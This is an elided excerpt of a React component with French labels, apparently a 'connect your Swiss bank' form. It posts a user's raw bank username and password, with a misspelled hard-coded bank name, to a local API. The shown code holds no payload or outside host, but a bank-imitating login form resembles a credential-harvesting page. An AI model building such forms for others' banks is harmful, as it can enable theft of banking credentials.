...
export default function WiseConnect() {
    ...
    try {
      ...
      const response = await fetch("/api/operation", {
        ...
        body: JSON.stringify({ 
          username, 
          password, 
          bankName: "SWISSE-BANKING" // Ajout explicite du nom de la banque ici
        }),
      });
  ...
  return (
    <div className="bank-connect-container">
      ...
      <h1 className="bank-connect-title">Relier Swiss Banking</h1>
